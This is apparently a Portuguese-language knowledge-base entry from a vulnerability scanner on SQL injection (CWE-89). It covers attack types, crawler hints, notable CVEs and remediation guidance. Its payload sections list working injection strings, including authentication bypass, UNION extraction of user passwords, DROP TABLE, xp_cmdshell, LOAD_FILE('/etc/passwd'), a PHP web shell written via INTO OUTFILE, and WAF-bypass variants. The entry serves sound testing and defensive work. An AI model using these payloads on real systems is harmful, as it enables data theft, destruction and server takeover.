---
id: sql_injection
title: "SQL Injection"
module: "sqli"
severity: "CRITICAL"
cwe_id: "CWE-89"
cwe_title: "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
vrt_id: "injection.sql_injection"
---

## Summary
Entrada do usuário é concatenada em consultas SQL, permitindo alterar a lógica da query, extrair o banco inteiro, modificar dados e, em alguns casos, executar comandos no sistema operacional.

## Description
SQL injection ocorre quando dados controlados pelo usuário são interpretados como código SQL. Pode ser:

- **In-band (clássico):** erros, `UNION` ou boolean refletem dados na resposta.
- **Blind boolean:** verdadeiro/falso altera a resposta ou o status.
- **Blind time-based:** `SLEEP`/`WAITFOR` mede o tempo.
- **Out-of-band:** exfiltração via DNS/HTTP (Oracle, MSSQL, MySQL).
- **Second-order:** payload armazenado é executado depois em outra query.
- **Stacked queries:** múltiplas instruções no mesmo statement.

A falha aparece em filtros, ordenação, paginação, login, busca, relatórios e APIs. ORMs não protegem automaticamente se houver `createNativeQuery`, `Raw`, `whereRaw`, `$queryRawUnsafe` ou concatenação.

## Impact
- Dump de bancos inteiros: credenciais, PII, cartões, tokens.
- Alteração/exclusão de dados e fraude.
- Bypass de autenticação e escalada de privilégios.
- Leitura/escrita de arquivos e RCE via `xp_cmdshell`, `COPY`, `LOAD_FILE`, `INTO OUTFILE`.
- Movimento lateral para outros sistemas.
- Impacto CRITICAL.

## Payloads and Bypasses
```sql
-- Detecção
'
''
`
')
'))
' OR '1'='1
' OR 1=1-- -
' OR 1=1#
admin'--
admin' #
" OR ""="
' AND '1'='2

-- UNION
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT 1,2,3-- -
' UNION SELECT username,password FROM users-- -
' UNION ALL SELECT NULL,@@version,user()-- -

-- Boolean
' AND 1=1-- -
' AND 1=2-- -
' AND SUBSTRING(@@version,1,1)='8'-- -
' AND (SELECT COUNT(*) FROM users)>0-- -

-- Time-based
' AND SLEEP(5)-- -
' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -
'; WAITFOR DELAY '0:0:5'-- -
'||pg_sleep(5)--
' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -

-- Error-based
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)-- -
' AND 1=CONVERT(int,@@version)-- -
' AND CAST((SELECT version()) AS int)-- -

-- Stacked / RCE (quando permitido)
'; DROP TABLE users-- -
'; EXEC xp_cmdshell 'whoami'-- -
'; COPY (SELECT '') TO PROGRAM 'id'-- -
' UNION SELECT LOAD_FILE('/etc/passwd')-- -
' UNION SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/shell.php'-- -
```

WAF bypass:
```sql
-- Comentários inline e fragmentação
' UN/**/ION SEL/**/ECT NULL-- -
'/*!50000UNION*/ /*!50000SELECT*/ NULL-- -
' UNION%0ASELECT NULL-- -
'%09UNION%09SELECT%09NULL-- -
' uNiOn SeLeCt NULL-- -

-- Encoding
%27%20OR%201=1-- -
%2527%2520OR%25201%253D1-- -
' OR 0x31=0x31-- -
CHAR(39)||CHAR(79)||CHAR(82)

-- Sem espaços
'OR'1'='1
'/**/OR/**/1=1-- -
'OR(1=1)-- -

-- Alternativas
' OR 'a'='a
' OR TRUE-- -
' AND 1 LIKE 1-- -
' UNION SELECT NULL FROM dual-- -
```

Casos reais e mentalidade de ataque (RWBH): Yahoo (busca/filtros) e Uber (APIs internas) mostram injeção em `ORDER BY`, filtros e relatórios, não apenas no login; o atacante começa por erros e boolean, depois time-based e UNION.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `id`, `q`, `search`, `query`, `category`, `sort`, `order`, `filter`, `username`, `password`, `email`, `page`, `limit`, `offset`, `report`, `date`, `status`.
- **Paths comuns:** `/api/*`, `/login`, `/search`, `/products`, `/reports`, `/admin`, `/graphql`, `/export`, `/filter`.
- **Sinais:** erros SQL; diferença de resposta entre `1=1` e `1=2`; atraso com `SLEEP`; `ORDER BY` com erro; parâmetros numéricos sem validação.

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2023-34362 | MOVEit Transfer | 2023 | SQLi em endpoint de transferencia -- explorado em massa pelo grupo Cl0p, comprometeu centenas de organizacoes | Blind SQLi (pre-auth) |
| CVE-2023-48788 | Fortinet FortiClientEMS | 2023 | SQLi no servico de gerenciamento de endpoints -- permite execucao remota via DBA | SQLi to RCE (pre-auth) |
| CVE-2020-12271 | Sophos XG Firewall | 2020 | SQLi em SFOS explorado in-the-wild (Asnarok campaign) -- atacantes injetaram trojan via interface de gerenciamento | In-band SQLi (pre-auth) |
| CVE-2024-50330 | Ivanti Endpoint Manager | 2024 | SQLi remoto sem autenticacao no EPM -- permite comprometimento total do servidor de gerenciamento | Unauth SQLi |
| CVE-2024-1597 | PostgreSQL JDBC (pgjdbc) | 2024 | SQLi no driver JDBC quando PreferQueryMode=SIMPLE -- afeta qualquer app Java usando pgjdbc com essa config | Driver-level SQLi |
| CVE-2023-34991 | Fortinet FortiWLM | 2023 | SQLi no gerenciador wireless -- permite acesso nao autenticado a dados da rede | Unauth SQLi |
| CVE-2024-45387 | Apache Traffic Control | 2024 | SQLi no Traffic Ops -- usuario privilegiado executa queries arbitrarias (CVSS 9.9) | Auth SQLi |
| CVE-2023-0016 | SAP BPC MS 10.0 | 2023 | SQLi no Business Planning and Consolidation -- execucao de queries arbitrarias por atacante nao autenticado | Unauth SQLi |
| CVE-2023-0620 | HashiCorp Vault | 2023 | SQLi no backend de storage MSSQL do Vault -- permite manipulacao de secrets armazenados | Config-dependent SQLi |
| CVE-2024-27304 | pgx (Go PostgreSQL driver) | 2024 | SQLi no driver pgx para Go -- single query ou bind message permite injecao (CVSS 9.8) | Driver-level SQLi |
| CVE-2024-8275 | The Events Calendar (WordPress) | 2024 | SQLi via parametro 'order' -- plugin com 800k+ instalacoes ativas | Unauth SQLi |
| CVE-2024-12727 | Sophos Firewall | 2024 | SQLi pre-auth no email protection feature -- permite code execution remoto | SQLi to RCE (pre-auth) |

Fonte: cvelistV5 (MITRE CVE List v5 dataset)

## Recommendation
1. Usar queries parametrizadas/prepared statements em todas as consultas, incluindo `IN`, `ORDER BY`, `LIMIT` e relatórios.
```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE email = ?");
ps.setString(1, email);
```
2. Nunca concatenar entrada em SQL; evitar `createNativeQuery`, `whereRaw`, `$queryRawUnsafe`, `exec` e ORMs sem bind.
3. Para identificadores (colunas/tabelas), usar allowlist de valores, não bind (não é possível parametrizar identificadores).
4. Aplicar least privilege no usuário do banco; remover `FILE`, `xp_cmdshell`, `COPY ... PROGRAM`, `LOAD_FILE` e permissões de DDL desnecessárias.
5. Usar ORM com bind e validação de tipos; nunca desabilitar escaping.
6. Implementar WAF como defesa em profundidade, mas não como correção.
7. Mascarar erros de banco e não retornar stack traces.
8. Auditar queries e alertar sobre padrões (`UNION`, `SLEEP`, comentários) e picos de erro.
9. Testar com sqlmap em ambiente autorizado e cobrir regressão com testes que tentem payloads clássicos.
